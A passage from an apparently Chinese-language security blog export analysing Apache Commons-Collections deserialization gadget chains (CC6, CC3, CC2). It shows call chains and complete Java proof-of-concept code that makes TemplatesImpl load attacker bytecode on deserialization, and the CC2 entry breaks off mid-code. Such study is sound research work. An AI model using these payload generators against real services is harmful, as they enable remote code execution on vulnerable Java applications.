Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections6.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><ul>
<li><a href="https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/">https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/</a></li>
<li><a href="https://xz.aliyun.com/t/11562">https://xz.aliyun.com/t/11562</a></li>
<li><a href="https://www.runoob.com/java/java-hashset.html">https://www.runoob.com/java/java-hashset.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/519958997">https://zhuanlan.zhihu.com/p/519958997</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化之CC3链分析</title>
    <url>/2024/05/07/CC3/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>jdk：jdk8u65<br>CC：Commons-Collections 3.2.1</p>
<p>和Java利用defineClass()加载动态字节码原理相似,可以参考:<br>但是只加载恶意类 不初始化的话 是不会执行代码的，还需要一个 newInstance 初始化的操作。<br>defineClass() 往往都是 protected类型的 只能通过反射去调用</p>
<p>具体调试和过程都在这篇文章:[[java加载动态字节码]]<br>初步链子:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">  TemplatesImpl#getTransletInstance()</span><br><span class="line">    TemplatesImpl#defineTransletClasses()</span><br><span class="line">      TransletClassLoader#defineClass()</span><br><span class="line">    Class#newInstance()</span><br></pre></td></tr></table></figure></p>
<p>CC3相对于CC1和CC6的优势是可以加载任意动态字节码,假如题目有黑名单限制不能出现flag等敏感词,我们就可以通过这种方法来绕过</p>
<p>而我们最终的目标就是调用TemplatesImpl.newTransformer()</p>
<h3 id="CC1加TemplatesImpl"><a href="#CC1加TemplatesImpl" class="headerlink" title="CC1加TemplatesImpl"></a>CC1加TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_TemplatesImpl</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;1vxyz&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Java-IDEA\\java_workspace\\CC\\target\\classes\\org\\example\\evil.class&quot;</span>));</span><br><span class="line">            <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//templates.newTransformer();</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">                    &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">            HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line">            <span class="comment">//serialize(o);</span></span><br><span class="line">            unserialize(<span class="string">&quot;cc1_templatesImpl.bin&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object,String field_name,Object filed_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">            Class clazz=object.getClass();</span><br><span class="line">            Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">            declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            declaredField.set(object,filed_value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1_templatesImpl.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="CC6加TemplatesImpl"><a href="#CC6加TemplatesImpl" class="headerlink" title="CC6加TemplatesImpl"></a>CC6加TemplatesImpl</h3><p>最终sink点用transform反射调用TemplatesImpl.newTransformer()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_Temp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;1vxyz&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\JavaProject\\easyjava\\src\\main\\java\\com\\butler\\springboot14shiro\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object,String field_name,Object filed_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="CC3本身"><a href="#CC3本身" class="headerlink" title="CC3本身"></a>CC3本身</h3><p>我们原理就是TemplatesImpl#newTransformer()<br>我们可以往上查找谁调用了这个方法<br>这里我们找到了 TrAXFilter类<br>至于TrAXFilter，虽然它也是不能序列化的，但是它的构造函数里有搞头<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113000638.png" alt="Pasted image 20231113000638.png"></p>
<p>一个新的类 InstantiateTransformer<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113001025.png" alt="Pasted image 20231113001025.png"></p>
<p>可以看一下这个类的transform方法 这里它会判断参数 是否是CLass类型，是的话 然后会获取这个指定参数类型的Class，指构造器 然后调它的构造函数 .newInstance()实例化<br>完美符合了我们的需求 我们可以通过 <code>InstantiateTransformer.transform()</code> 获取 TrAXFilter类构造器,就是传入的input参数,并初始化 实现 <code>templates.newTransformer()</code></p>
<h3 id="链子"><a href="#链子" class="headerlink" title="==链子:=="></a>==链子:==</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter#TrAXFilter()</span><br><span class="line"> TemplatesImpl#newTransformer()</span><br><span class="line">    TemplatesImpl#getTransletInstance()</span><br><span class="line">      TemplatesImpl#defineTransletClasses()</span><br><span class="line">        TransletClassLoader#defineClass()</span><br><span class="line">      Class#newInstance()</span><br></pre></td></tr></table></figure>
<p>我们现在只需要一个可控的transform方法了,随便抄个CC6或者CC1的前面就行<br>我还是喜欢用CC6,又短又没有限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;1vxyz&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\JavaProject\\easyjava\\src\\main\\java\\com\\butler\\springboot14shiro\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;seraa.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object,String field_name,Object filed_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seraa.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231113004229.png" alt="Pasted image 20231113004229.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://www.cnblogs.com/1vxyz/articles/17593980.html">https://www.cnblogs.com/1vxyz/articles/17593980.html</a></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化之CC2链分析</title>
    <url>/2024/05/07/CC2/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>poe.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>jdk: jdk8u71<br>CC: Commons-Collections4.0,注意这里的依赖和之前不一样的</p>
<p>我们这里不能像CC4那样利用 TransformingComparator.compare() -&gt; InstantiateTransformer.transform() -&gt; TrAXFilter.TrAXFilter() 去调用 TemplatesImpl.newTransformer()</p>
<p>而是直接利用 InvokerTransformer.transform()来调用TemplatesImpl.newTransformer()</p>
<p>因此我们只需要修改<code>Transformer[]</code>和<code>ChainedTransformer</code><br>用 InvokerTransformer.transform()来替代</p>
<h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()  </span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">            PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">								TemplatesImpl#getTransletInstance()</span><br><span class="line">			      					TemplatesImpl#defineTransletClasses()</span><br><span class="line">			        					TransletClassLoader#defineClass()</span><br><span class="line">                                			defineClass()-&gt;newInstance()</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<h3 id="poc及过程"><a href="#poc及过程" class="headerlink" title="poc及过程"></a>poc及过程</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;1vxyz&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\JavaProject\\easyjava\\src\\main\\java\\com\\butler\\springboot14shiro\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">//transformingComparator.compare(1,2);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 